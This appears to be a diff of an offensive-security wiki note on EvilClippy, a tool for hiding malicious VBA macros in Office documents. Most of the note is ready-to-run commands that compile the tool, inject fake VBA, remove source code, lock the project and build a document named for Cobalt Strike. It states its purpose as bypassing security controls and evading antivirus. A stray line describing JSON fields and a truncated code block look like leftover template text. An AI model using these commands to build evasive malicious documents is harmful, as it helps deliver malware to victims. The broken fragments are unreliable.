@@ -36,11 +36,15 @@ From an offensive perspective, this technique can be used to deliver a payload t
 
 The business value of this technique is that it allows attackers to bypass security controls and deliver malware to a victim's machine. This can lead to data theft, system compromise, and other malicious activities.
 
+ 
+
 ## Requirements
 
 1. A Microsoft Office document with VBA code
 
 1. EvilClippy tool
+
+ 
 
 ## Defense
 
@@ -50,6 +54,8 @@ The business value of this technique is that it allows attackers to bypass secur
 
 1. Use endpoint detection and response (EDR) tools to detect and respond to malicious activity
 
+ 
+
 ## Objectives
 
 1. To bypass security controls in Microsoft Office documents
@@ -58,14 +64,24 @@ The business value of this technique is that it allows attackers to bypass secur
 
 1. To avoid detection by traditional antivirus software
 
+ 
+
 # Instructions
 
 1. EvilClippy is a tool used to create malicious Microsoft Office macros. The tool can be used to obfuscate and hide malicious macros from detection by security tools. The tool provides multiple commands to create malicious macros such as -s, -g, -t, and -r. The -s command is used to specify the name of the VBA script file to add to the macro. The -g command is used to generate an obfuscated version of the macro. The -t command is used to specify the version of Microsoft Office to target. The -r command is used to remove the VBA source code from the macro and leave only the compiled code. EvilClippy can also mark the project as locked and unviewable using the -u command.
 
+ 
+
+
+
 **Code**: [[# OSX/Linux
 mcs /reference:OpenMcdf.dll,System.IO.]]
 
+
+
 > The 'data' field of this JSON object provides the command line instructions to use EvilClippy. The 'lang' field specifies the language used to write the tool. The 'instruction' field provides a brief overview of EvilClippy and its commands. The 'explain' field provides a detailed explanation of the commands used in EvilClippy.
+
+
 
 **Command** ([[Compile EvilClippy.exe on OSX/Linux]]):
 
@@ -73,11 +89,19 @@ mcs /reference:OpenMcdf.dll,System.IO.]]
 mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
 ```
 
+
+
+
+
 **Command** ([[Compile EvilClippy.exe on Windows]]):
 
 ```bash
 csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
 ```
+
+
+
+
 
 **Command** ([[Generate malicious macro with fake.vbs script]]):
 
@@ -85,11 +109,19 @@ csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy
 EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
 ```
 
+
+
+
+
 **Command** ([[Inject fake VBA code into macrofile.doc for Office 2016 x86]]):
 
 ```bash
 EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
 ```
+
+
+
+
 
 **Command** ([[Inject fake VBA code into macrofile.doc for Office 2013 x64]]):
 
@@ -97,17 +129,27 @@ EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
 EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc
 ```
 
+
+
+
+
 **Command** ([[Mark project as locked and unviewable]]):
 
 ```bash
 EvilClippy.exe -u macrofile.doc
 ```
 
+
+
+
+
 **Command** ([[Confuse analysis tools with -r flag]]):
 
 ```bash
 EvilClippy.exe -r macrofile.doc
 ```
+
+
 
 ## Commands Used
 
@@ -124,3 +166,5 @@ EvilClippy.exe -r macrofile.doc
 - [[EvilClippy]]
 - [[Office - Attacks]]
 - [[VBA Purging]]
+
+
